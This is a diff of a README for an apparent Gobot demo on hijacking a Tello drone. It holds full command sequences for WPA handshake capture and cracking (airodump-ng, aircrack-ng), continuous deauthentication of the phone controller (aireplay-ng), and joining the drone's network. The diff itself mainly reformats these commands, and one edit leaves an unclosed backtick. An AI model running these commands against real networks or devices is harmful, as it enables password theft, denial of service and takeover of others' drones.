@@ -26,7 +26,9 @@ go get -d -u gobot.io/x/gobot/...
 
 Begin by listing wireless interfaces that support monitor mode with:
 
-`airmon-ng`
+```
+airmon-ng
+```
 
 If you do not see an interface listed then your wireless card does not support monitor mode.
 
@@ -45,11 +47,7 @@ Killing these processes:
   868 wpa_supplicant
 ```
 
-Then list out the wireless interfaces you have:
-
-`iwconfig`
-
-You should see output similar to this:
+Then list out the wireless interfaces you have with `iwconfig, you should see output similar to this:
 
 ```
 root@kali:~/ggd# iwconfig
@@ -66,17 +64,16 @@ wlan0     IEEE 802.11  ESSID:off/any
 
 We will assume your wireless interface name is `wlan0`:
 
-`airmon-ng start wlan0`
+```
+airmon-ng start wlan0
+```
 
 This may create a new interface that is named something else, so be sure to check with `iwconfig` to use the correct interface name for the rest of the demo.
 
 Then scan the networks:
 
-`airodump-ng wlan0`
-
-Look for the network called `TELLO-D42128`, and make note of the `BSSID` (the Tello drone wifi access point MAC address), channel number and `STATION` (the controller's MAC address):
-
 ```
+root@kali:~/ggd# airodump-ng wlan0
 
  CH  3 ][ Elapsed: 1 min ][ 2019-02-03 09:50                                       
                                                                                                                                                              
@@ -91,10 +88,11 @@ Look for the network called `TELLO-D42128`, and make note of the `BSSID` (the Te
                                                                                                                                                               
  BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                    
                                                                                                                                                                                                                                          
-60:60:1F:D4:21:28  D4:61:9D:EE:49:2F  -32   54e-54e  5993    30022  TELLO-D42128                                                                                              
+ 60:60:1F:D4:21:28  D4:61:9D:EE:49:2F  -32   54e-54e  5993    30022  TELLO-D42128                                                                                              
 ```
 
-In the above, these are:
+Look for the network called `TELLO-D42128`, and make note of the `BSSID` (the Tello drone wifi access point MAC address), channel number and `STATION` (the controller's MAC address):
+ In the above, these are:
 
 * WiFi channel: `3`
 * Tello drone MAC address: `60:60:1F:D4:21:28`
@@ -111,7 +109,9 @@ airmon-ng start wlan0 3
 
 Sniff the airwaves for a handshake:
 
-`airodump-ng -c 3 -b 60:60:1F:D4:21:28 -w ggd wlan0`
+```
+airodump-ng -c 3 -b 60:60:1F:D4:21:28 -w ggd wlan0
+```
 
 You should see a that a WPA handshake has been captured after a while in the right topmost corner of the terminal window:
 
@@ -121,13 +121,17 @@ CH  8 ][ Elapsed: 12 s ][ 2019-02-03 10:03 ][ WPA handshake: 60:60:1F:D4:21:28
 
 ### Step 3: Crack the handshake and obtain WiFi password
 
-`aircrack-ng ggd-01.cap -w passwords.txt`
+```
+aircrack-ng ggd-01.cap -w passwords.txt
+```
 
 ### Step 4: Deauthenticate me
 
 Deauthenticate the iPhone controller:
 
-`aireplay-ng --deauth 0 -a 60:60:1F:D4:21:28 -c D4:61:9D:EE:49:2F wlan0`
+```
+aireplay-ng --deauth 0 -a 60:60:1F:D4:21:28 -c D4:61:9D:EE:49:2F wlan0
+```
 
 ### Step 5: Hijack the drone!
 
@@ -137,13 +141,12 @@ Keep the above command running, and connect to the `TELLO-D42128` network with t
 
 Open a text editor and insert the correct password in the `wpa_supplicant.conf` file.
 
-Then disable monitor mode:
+Then disable monitor mode, and start wpa_supplicant:
 
-`airmon-ng stop wlan0`
-
-Start wpa_supplicant:
-
-`wpa_supplicant -i wlan0 -c wpa_supplicant.conf -D nl80211`
+```
+airmon-ng stop wlan0
+wpa_supplicant -i wlan0 -c wpa_supplicant.conf -D nl80211
+```
 
 In another terminal window check that you are connected, and ask for an IP:
 
